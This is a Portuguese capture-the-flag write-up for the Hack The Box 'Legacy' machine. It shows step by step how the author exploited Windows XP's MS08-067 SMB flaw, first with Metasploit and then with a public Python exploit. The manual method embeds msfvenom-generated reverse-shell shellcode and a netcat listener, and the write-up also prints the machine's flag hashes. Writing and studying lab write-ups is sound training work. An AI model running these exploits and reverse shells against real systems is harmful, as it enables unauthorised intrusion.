---
title:     "Hack The Box - Legacy"
tags: [windows,easy,smb,CVE-2008-4250]
categories: HackTheBox
---


![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-legacy/1.jpg)


Nós vamos abrir o acesso a partir do Hack The Box.

Link: <https://www.hackthebox.eu/home/machines/profile/2>

Agora, vamos começar a enumeração inicial usando o nmap.
## Nmap Scan Results:

```
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h31m02s, deviation: 2h07m16s, median: 4d23h01m02s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:70:7e (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-06-25T02:06:05+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

## NSE Scripts:

Utilizando os scripts NSE do nmap, podemos realizar mais um scan em busca de vulnerabilidades.
```
root@kali:~/HTB-Windows/Legacy# nmap -p139,445 --script vuln 10.10.10.4               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 19:17 EDT              
Nmap scan report for 10.10.10.4
Host is up (0.20s latency).  
                                          
PORT    STATE SERVICE                                                                
139/tcp open  netbios-ssn   
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds       
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Host script results:                                                                                                                                                [3/117]
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED                                                                                                                        
| smb-vuln-ms08-067: 
|   VULNERABLE:                                                                      
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```
## Find Exploits:

De acordo com o resultado do nmap utilizando os scripts em busca de vulns, foi encontrada duas vulnerabilidades **smb-vuln-ms08-067** e **smb-vuln-ms17-010**, com o searchsploit podemos procurar por exploits disponiveis.

searchsploit ms08-067
```
root@kali:~/HTB-Windows/Legacy# searchsploit ms08-067
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)                                                                    | windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS08-067)                                                                                     | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-067)                                                                               | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Metasploit)                                                | windows/remote/16362.rb
Microsoft Windows Server - Universal Code Execution (MS08-067)                                                                           | windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                                                           | windows/remote/7132.py
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

searchsploit ms17-010
```
root@kali:~/HTB-Windows/Legacy# searchsploit ms17-010
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)                | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                                            | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                         | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                     | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                               | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                            | windows_x86-64/remote/41987.py
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Exploitation smb-vuln-ms08-067 method 1:

Tentei outras formas de explorar manualmente sem o uso do MSFCONSOLE, no entanto, tive dificuldades por conta que sempre a maquina dava pau. Depois de muitas tentativas sem sucesso resolvi usar o MSFCONSLE.

Iniciamos nosso MSFCONSOLE.
```
root@kali:~/HTB-Windows# msfconsole                                                                                                                               [697/697]
                                                                                                                                                                           
                                   ___          ____                                                                                                                       
                               ,-""   `.      < HONK >                                                                                                                     
                             ,'  _   e )`-._ /  ----                                                                                                                       
                            /  ,' `-._<.===-'                                                                                                                              
                           /  /                                                                                                                                            
                          /  ;                                                                                                                                             
              _          /   ;                                                                                                                                             
 (`._    _.-"" ""--..__,'    |                                                                                                                                             
 <_  `-""                     \                                                                                                                                            
  <`-                          :                                                                                                                                           
   (__   <__.                  ;                                                                                                                                           
     `-.   '-.__.      _.'    /                                                                                                                                            
        \      `-.__,-'    _,'                                                                                                                                             
         `._    ,    /__,-'                                                                                                                                                
            ""._\__,'< <____                                                                                                                                               
                 | |  `----.`.                                                                                                                                             
                 | |        \ `.                                                                                                                                           
                 ; |___      \-``                                                                                                                                          
                 \   --<                                                                                                                                                   
                  `.`.<                                                                                                                                                    
                    `-'                                                                                                                                                    
                                                                                                                                                                           
                                                                                                                                                                           
                                                                                                                                                                           
       =[ metasploit v5.0.92-dev                          ]                                                                                                                
+ -- --=[ 2026 exploits - 1102 auxiliary - 343 post       ]                                                                                                                
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]                                                                                                                
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn more
```

Depois de iniciado, procuramos por netapi referente a noss vuln encontrada na etapa anteriot.
```
msf5 exploit(windows/smb/ms17_010_psexec) > search netapi

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms03_049_netapi  2003-11-11       good    No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
   1  exploit/windows/smb/ms06_040_netapi  2006-08-08       good    No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
   2  exploit/windows/smb/ms06_070_wkssvc  2006-11-14       manual  No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
   3  exploit/windows/smb/ms08_067_netapi  2008-10-28       great   Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```

Selecionamos então o **exploit/windows/smb/ms08_067_netapi** MS08-067 Microsoft Server Service Relative Path Stack Corruption
Lembre-se que essa maquina pode crashar e será preciso reiniciar.
```
msf5 exploit(windows/smb/ms17_010_psexec) > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > show options 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```

Veja alguns erros que eu tive
```
msf5 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
rhosts => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.36:4444 
[-] 10.10.10.4:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection timed out (10.10.10.4:445).
[*] Exploit completed, but no session was created.
msf5 exploit(windows/smb/ms08_067_netapi) > set verbose true
verbose => true
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.36:4444 
[-] 10.10.10.4:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection timed out (10.10.10.4:445).
[*] Exploit completed, but no session was created.
msf5 exploit(windows/smb/ms08_067_netapi) > ping 10.10.10.4
[*] exec: ping 10.10.10.4

PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=203 ms
64 bytes from 10.10.10.4: icmp_seq=2 ttl=127 time=211 ms
64 bytes from 10.10.10.4: icmp_seq=3 ttl=127 time=244 ms
```

Depois de ter reiniciado a maquina executamos o exploit novamente.
```
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.36:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.10.10.4:1032) at 2020-06-20 13:50:34 -0400

meterpreter > shell
Process 1840 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
```

## Search FLAG user e root

Retornamos a nossa sessão do meterpreter e usando o **search -f** encontramos rápidamente as flags.
```
Terminate channel 1? [y/N]  y
meterpreter > search -f root.txt
Found 1 result...
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
meterpreter > search -f user.txt
Found 1 result...
    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
```

Agora podemos ler e submeter na plataforma

```
meterpreter > shell
Process 1552 created.
Channel 2 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>type "c:\Documents and Settings\Administrator\Desktop\root.txt"
type "c:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713
C:\WINDOWS\system32>type "c:\Documents and Settings\john\Desktop\user.txt"
type "c:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f
C:\WINDOWS\system32>
```

## Exploitation smb-vuln-ms08-067 method 2 without metasploit:

***reference*** https://github.com/andyacer/ms08_067

clone o repo no seu kali

```
root@kali:~/HTB-Windows/exploit-dev# git clone https://github.com/andyacer/ms08_067.git                     
Cloning into 'ms08_067'...                                                           
remote: Enumerating objects: 37, done.                                               
remote: Total 37 (delta 0), reused 0 (delta 0), pack-reused 37               
Receiving objects: 100% (37/37), 13.01 KiB | 309.00 KiB/s, done.              
Resolving deltas: 100% (11/11), done.                                                                                                                                      
root@kali:~/HTB-Windows/exploit-dev# ls
ms08_067                                                                             
root@kali:~/HTB-Windows/exploit-dev# cd ms08_067/                                                                                                                          
root@kali:~/HTB-Windows/exploit-dev/ms08_067# ls
LICENSE  ms08_067_2018.py  README.md          
```

Execute o exploit

```
root@kali:~/HTB-Windows/exploit-dev/ms08_067# python ms08_067_2018.py 
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################


Usage: ms08_067_2018.py <target ip> <os #> <Port #>

Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal
Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English
Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)
Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)
Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)

Also: nmap has a good OS discovery script that pairs well with this exploit:
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
```

Veja os examplos no menu do exploit, precisamos editar o exploit para trabalhar com nossas configuracoes referente a nossa maquina.

edite o exploit e leia as instrucoes deixadas pelo dev

```
# ------------------------------------------------------------------------                                                                                                 
# REPLACE THIS SHELLCODE with shellcode generated for your use                                                                                                             
# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.                                                             
#                                                                                                                                                                          
# Example msfvenom commands to generate shellcode:                                                                                                                         
# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows                      
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows                   
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows                 
                                                                                                                                                                           
# Reverse TCP to 10.11.0.157 port 62000:                                                                                                                                   
shellcode=(                                                                                                                                                                
"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"                                                                                                             
"\x42\xf6\xc3\xef\x83\xee\xfc\xe2\xf4\xbe\x1e\x41\xef\x42\xf6"                                                                                                             
"\xa3\x66\xa7\xc7\x03\x8b\xc9\xa6\xf3\x64\x10\xfa\x48\xbd\x56"                                                                                                             
"\x7d\xb1\xc7\x4d\x41\x89\xc9\x73\x09\x6f\xd3\x23\x8a\xc1\xc3"                                                                                                             
"\x62\x37\x0c\xe2\x43\x31\x21\x1d\x10\xa1\x48\xbd\x52\x7d\x89"                                                                                                             
"\xd3\xc9\xba\xd2\x97\xa1\xbe\xc2\x3e\x13\x7d\x9a\xcf\x43\x25"                                                                                                             
"\x48\xa6\x5a\x15\xf9\xa6\xc9\xc2\x48\xee\x94\xc7\x3c\x43\x83"   
```

Observe que existe os comandos deixados para gerar nossa **SHELLCODE** com nosso **IP**  e **PORT** escolhida.

Vamos gerar nossa shellcode e adicionar no exploit.

```
root@kali:~/HTB-Windows/exploit-dev# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.36 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --
platform windows                                                                     
Found 11 compatible encoders                                                         
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1488 bytes
unsigned char buf[] = 
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x8e\xb5\xa8\xf1\x83\xee\xfc\xe2\xf4\x72\x5d\x2a\xf1\x8e\xb5"
"\xc8\x78\x6b\x84\x68\x95\x05\xe5\x98\x7a\xdc\xb9\x23\xa3\x9a"
"\x3e\xda\xd9\x81\x02\xe2\xd7\xbf\x4a\x04\xcd\xef\xc9\xaa\xdd"
"\xae\x74\x67\xfc\x8f\x72\x4a\x03\xdc\xe2\x23\xa3\x9e\x3e\xe2"
"\xcd\x05\xf9\xb9\x89\x6d\xfd\xa9\x20\xdf\x3e\xf1\xd1\x8f\x66"
"\x23\xb8\x96\x56\x92\xb8\x05\x81\x23\xf0\x58\x84\x57\x5d\x4f"
"\x7a\xa5\xf0\x49\x8d\x48\x84\x78\xb6\xd5\x09\xb5\xc8\x8c\x84"
"\x6a\xed\x23\xa9\xaa\xb4\x7b\x97\x05\xb9\xe3\x7a\xd6\xa9\xa9"
"\x22\x05\xb1\x23\xf0\x5e\x3c\xec\xd5\xaa\xee\xf3\x90\xd7\xef"
"\xf9\x0e\x6e\xea\xf7\xab\x05\xa7\x43\x7c\xd3\xdd\x9b\xc3\x8e"
"\xb5\xc0\x86\xfd\x87\xf7\xa5\xe6\xf9\xdf\xd7\x89\x4a\x7d\x49"
"\x1e\xb4\xa8\xf1\xa7\x71\xfc\xa1\xe6\x9c\x28\x9a\x8e\x4a\x7d"
"\xa1\xde\xe5\xf8\xb1\xde\xf5\xf8\x99\x64\xba\x77\x11\x71\x60"
"\x3f\x9b\x8b\xdd\xa2\xfb\x80\x91\xc0\xf3\x8e\xb4\x13\x78\x68"
"\xdf\xb8\xa7\xd9\xdd\x31\x54\xfa\xd4\x57\x24\x0b\x75\xdc\xfd"
"\x71\xfb\xa0\x84\x62\xdd\x58\x44\x2c\xe3\x57\x24\xe6\xd6\xc5"
"\x95\x8e\x3c\x4b\xa6\xd9\xe2\x99\x07\xe4\xa7\xf1\xa7\x6c\x48"
"\xce\x36\xca\x91\x94\xf0\x8f\x38\xec\xd5\x9e\x73\xa8\xb5\xda"
"\xe5\xfe\xa7\xd8\xf3\xfe\xbf\xd8\xe3\xfb\xa7\xe6\xcc\x64\xce"
"\x08\x4a\x7d\x78\x6e\xfb\xfe\xb7\x71\x85\xc0\xf9\x09\xa8\xc8"
"\x0e\x5b\x0e\x48\xec\xa4\xbf\xc0\x57\x1b\x08\x35\x0e\x5b\x89"
"\xae\x8d\x84\x35\x53\x11\xfb\xb0\x13\xb6\x9d\xc7\xc7\x9b\x8e"
"\xe6\x57\x24";
```

Copiamos a shellcode gerada e adicionamos ao exploit, observe que user a versao para **REVERSE_TCP**

Depois de editado e salvo nosso exploit, ativamos o listen usando o nc na port 443

```
root@kali:~/HTB-Windows/exploit-dev# rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Agora, executamos nosso exploit ja editado. Lebre de usar a opcao de acordo com seu alvo, neste caso **6** referente a **Windows XPSP3 EN**

`Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)`

```
root@kali:~/HTB-Windows/exploit-dev/ms08_067# python ms08_067_2018.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

Temos nossa reverse shell  de Administrator!

```
root@kali:~/HTB-Windows/exploit-dev# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.4] 1057
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Administrator\Desktop>
```




